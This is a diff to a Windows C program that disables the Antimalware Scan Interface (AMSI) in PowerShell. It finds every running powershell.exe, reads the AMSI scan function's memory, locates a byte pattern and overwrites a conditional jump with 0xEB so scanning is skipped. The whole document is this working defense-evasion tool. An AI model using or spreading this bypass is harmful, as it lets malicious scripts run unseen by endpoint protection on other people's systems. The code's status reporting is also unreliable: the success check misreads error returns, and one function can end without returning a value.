@@ -11,37 +11,9 @@
 
 char patch[] = { 0xEB };
 
-DWORD
-GetPID(
-	LPCWSTR pn)
-{
-	DWORD procId = 0;
-	HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+int onemessage = 1;
 
-	if (hSnap != INVALID_HANDLE_VALUE)
-	{
-		PROCESSENTRY32 pE;
-		pE.dwSize = sizeof(pE);
-
-		if (Process32First(hSnap, &pE))
-		{
-			if (!pE.th32ProcessID)
-				Process32Next(hSnap, &pE);
-			do
-			{
-				if (!lstrcmpiW((LPCWSTR)pE.szExeFile, pn))
-				{
-					procId = pE.th32ProcessID;
-					break;
-				}
-			} while (Process32Next(hSnap, &pE));
-		}
-	}
-	CloseHandle(hSnap);
-	return (procId);
-}
-
-unsigned long long int
+int
 searchPattern(
 	BYTE* startAddress,
 	DWORD searchSize,
@@ -58,28 +30,22 @@ searchPattern(
 				j++;
 			}
 			if (j == patternSize) {
-				printf("offset : %d\n", i + 3);
 				return (i + 3);
 			}
 		}
 		i++;
 	}
+	return (i);
 }
 
-
-int
-wmain() {
-
+int patchAmsi(DWORD tpid)
+{
 	BYTE pattern[] = { 0x48,'?','?', 0x74,'?',0x48,'?' ,'?' ,0x74 };
 
 	DWORD patternSize = sizeof(pattern);
 
-	DWORD tpid = GetPID(L"powershell.exe");
-
 	if (!tpid)
 		return (-1);
-		
-	printf("Process PID %d\n", tpid);
 
 	HANDLE ProcessHandle = OpenProcess(PROCESS_VM_OPERATION | PROCESS_VM_READ | PROCESS_VM_WRITE, 0, tpid);
 
@@ -95,8 +61,6 @@ wmain() {
 	if (!AmsiAddr)
 		return(-1);
 
-	printf("AMSI address %X\n", AmsiAddr);
-
 	unsigned char buff[1024];
 
 	if (!ReadProcessMemory(ProcessHandle, AmsiAddr, &buff, 1024, (SIZE_T*)NULL))
@@ -104,6 +68,16 @@ wmain() {
 
 	int matchAddress = searchPattern(buff, sizeof(buff), pattern, patternSize);
 
+	if (matchAddress == 1024)
+		return (144);
+
+	if (onemessage)
+	{
+		printf("AMSI address %X\n", AmsiAddr);
+
+		printf("offset : %d\n", matchAddress);
+		onemessage = 0;
+	}
 	unsigned long long int updateAmsiAdress = (unsigned long long int)AmsiAddr;
 
 	updateAmsiAdress += matchAddress;
@@ -111,7 +85,55 @@ wmain() {
 	if (!WriteProcessMemory(ProcessHandle, (PVOID)updateAmsiAdress, patch, 1, 0))
 		return (-1);
 
-	printf("AMSI patched\n");
+}
+
+void
+PatchAllPowershells(
+	const char *pn)
+{
+	int result   = 0;
+	DWORD procId = 0;
+	HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+
+	if (hSnap != INVALID_HANDLE_VALUE)
+	{
+		PROCESSENTRY32 pE;
+		pE.dwSize = sizeof(pE);
+
+		if (Process32First(hSnap, &pE))
+		{
+			if (!pE.th32ProcessID)
+				Process32Next(hSnap, &pE);
+			do
+			{
+				if (!_stricmp(pE.szExeFile, pn))
+				{
+					procId = pE.th32ProcessID;
+
+					if (result = patchAmsi(procId))
+						printf("AMSI patched %d\n", pE.th32ProcessID);
+					else if (result == 144)
+						printf("already patched \n");
+					else
+						printf("patch failed \n");
+					
+				}
+			} while (Process32Next(hSnap, &pE));
+		}
+	}
+
+	CloseHandle(hSnap);
+
+	return ;
+}
+
+
+int
+wmain() {
+
+	PatchAllPowershells("powershell.exe");
+
+	printf("AMSI patched in all powershells\n");
 
 	system("pause");
 
